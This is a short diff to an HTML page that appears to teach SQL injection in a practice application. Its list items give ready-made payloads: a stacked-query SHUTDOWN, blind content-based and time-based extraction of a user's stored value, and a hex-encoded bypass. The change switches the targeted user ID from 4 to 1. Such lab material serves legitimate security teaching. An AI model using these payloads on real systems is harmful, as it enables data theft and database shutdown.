@@ -13,10 +13,10 @@
 <li>Enter <code>' ; SHUTDOWN; -- </code> to execute stored procedure sql injection.
 </li>
 <br/>
-<li>Enter <code>hacker' AND (SELECT SUBSTRING(InfoValue, <span style='color:red'> 1</span>, 1) from users_information P where P.userId = 4) = '<span style='color:red'>c</span>' -- </code> to perform blind content-based sql injection.
+<li>Enter <code>hacker' AND (SELECT SUBSTRING(InfoValue, <span style='color:red'> 1</span>, 1) from users_information P where P.userId = 1) = '<span style='color:red'>c</span>' -- </code> to perform blind content-based sql injection.
 </li>
 <br/>
-<li>Enter <code>hacker' AND (SELECT sleep(5) from users_information P where P.userId = 4 AND SUBSTRING(InfoValue, <span style='color:red'> 1</span>, 1)  = '<span style='color:red'>c</span>') -- </code> to perform blind time-based sql injection.
+<li>Enter <code>hacker' AND (SELECT sleep(5) from users_information P where P.userId = 1 AND SUBSTRING(InfoValue, <span style='color:red'> 1</span>, 1)  = '<span style='color:red'>c</span>') -- </code> to perform blind time-based sql injection.
 </li>
 <br/>
 <li>Enter <code>hacker' OR char(0x64726f70) = 'drop' -- </code> to perform character encoding-based sql injection.
